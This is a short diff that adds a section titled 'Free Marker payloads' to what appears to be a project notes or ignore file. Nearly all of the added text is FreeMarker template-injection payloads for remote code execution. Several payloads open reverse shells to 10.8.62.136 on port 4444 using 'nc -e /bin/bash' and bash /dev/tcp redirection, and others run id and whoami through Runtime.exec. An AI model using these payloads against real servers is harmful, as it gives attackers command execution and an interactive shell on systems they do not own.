@@ -83,4 +83,11 @@ templates/
 static/
 
 
+Free Marker payloads
 
+RCE freemarker
+${"freemarker.template.utility.Execute"?new()("nc -e /bin/bash 10.8.62.136 4444")}
+
+
+${"freemarker.template.utility.Execute"?new()("bash -c bash -i >& /dev/tcp/10.8.62.136/4444 0>&1")}${"freemarker.template.utility.Execute"?new()("nc -e /bin/bash 10.8.62.136 4444")}
+${[].getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}${"freemarker.template.utility.Execute"?new()("whoami")}${"freemarker.template.utility.Execute"?new()("id")}
